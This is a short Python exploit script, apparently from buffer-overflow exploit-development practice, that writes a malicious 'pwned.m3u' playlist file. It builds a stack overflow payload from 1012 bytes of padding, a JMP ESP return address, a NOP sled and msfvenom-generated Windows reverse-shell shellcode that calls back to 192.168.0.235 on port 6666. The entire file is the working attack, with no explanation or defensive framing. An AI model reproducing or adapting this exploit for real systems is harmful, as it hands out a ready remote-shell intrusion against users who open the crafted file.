from pwn import *

badchars = b'\x00\x0a\x1a'
chars = bytes([i for i in range(0x100)])
chars = chars.translate(None,badchars)

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.235 LPORT=6666 -b "\x00\x0a\x1a" -f python -v shellcode
shellcode =  b""
shellcode += b"\xda\xd8\xd9\x74\x24\xf4\x58\xbe\x08\xbb\x16"
shellcode += b"\x83\x31\xc9\xb1\x52\x31\x70\x17\x03\x70\x17"
shellcode += b"\x83\xc8\xbf\xf4\x76\x34\x57\x7a\x78\xc4\xa8"
shellcode += b"\x1b\xf0\x21\x99\x1b\x66\x22\x8a\xab\xec\x66"
shellcode += b"\x27\x47\xa0\x92\xbc\x25\x6d\x95\x75\x83\x4b"
shellcode += b"\x98\x86\xb8\xa8\xbb\x04\xc3\xfc\x1b\x34\x0c"
shellcode += b"\xf1\x5a\x71\x71\xf8\x0e\x2a\xfd\xaf\xbe\x5f"
shellcode += b"\x4b\x6c\x35\x13\x5d\xf4\xaa\xe4\x5c\xd5\x7d"
shellcode += b"\x7e\x07\xf5\x7c\x53\x33\xbc\x66\xb0\x7e\x76"
shellcode += b"\x1d\x02\xf4\x89\xf7\x5a\xf5\x26\x36\x53\x04"
shellcode += b"\x36\x7f\x54\xf7\x4d\x89\xa6\x8a\x55\x4e\xd4"
shellcode += b"\x50\xd3\x54\x7e\x12\x43\xb0\x7e\xf7\x12\x33"
shellcode += b"\x8c\xbc\x51\x1b\x91\x43\xb5\x10\xad\xc8\x38"
shellcode += b"\xf6\x27\x8a\x1e\xd2\x6c\x48\x3e\x43\xc9\x3f"
shellcode += b"\x3f\x93\xb2\xe0\xe5\xd8\x5f\xf4\x97\x83\x37"
shellcode += b"\x39\x9a\x3b\xc8\x55\xad\x48\xfa\xfa\x05\xc6"
shellcode += b"\xb6\x73\x80\x11\xb8\xa9\x74\x8d\x47\x52\x85"
shellcode += b"\x84\x83\x06\xd5\xbe\x22\x27\xbe\x3e\xca\xf2"
shellcode += b"\x11\x6e\x64\xad\xd1\xde\xc4\x1d\xba\x34\xcb"
shellcode += b"\x42\xda\x37\x01\xeb\x71\xc2\xc2\xd4\x2e\xcc"
shellcode += b"\xf9\xbd\x2c\xcc\xe7\x37\xb8\x2a\x7d\x58\xec"
shellcode += b"\xe5\xea\xc1\xb5\x7d\x8a\x0e\x60\xf8\x8c\x85"
shellcode += b"\x87\xfd\x43\x6e\xed\xed\x34\x9e\xb8\x4f\x92"
shellcode += b"\xa1\x16\xe7\x78\x33\xfd\xf7\xf7\x28\xaa\xa0"
shellcode += b"\x50\x9e\xa3\x24\x4d\xb9\x1d\x5a\x8c\x5f\x65"
shellcode += b"\xde\x4b\x9c\x68\xdf\x1e\x98\x4e\xcf\xe6\x21"
shellcode += b"\xcb\xbb\xb6\x77\x85\x15\x71\x2e\x67\xcf\x2b"
shellcode += b"\x9d\x21\x87\xaa\xed\xf1\xd1\xb2\x3b\x84\x3d"
shellcode += b"\x02\x92\xd1\x42\xab\x72\xd6\x3b\xd1\xe2\x19"
shellcode += b"\x96\x51\x12\x50\xba\xf0\xbb\x3d\x2f\x41\xa6"
shellcode += b"\xbd\x9a\x86\xdf\x3d\x2e\x77\x24\x5d\x5b\x72"
shellcode += b"\x60\xd9\xb0\x0e\xf9\x8c\xb6\xbd\xfa\x84"

# !mona jmp -r ESP
jmp_esp = 0x1010539f
buf = b'A'*1012
buf += p32(jmp_esp)
buf += b'\x90'*100
# buf += b'\xcc'*4
# buf += chars
buf += shellcode

with open('pwned.m3u','wb') as f:
    f.write(buf)
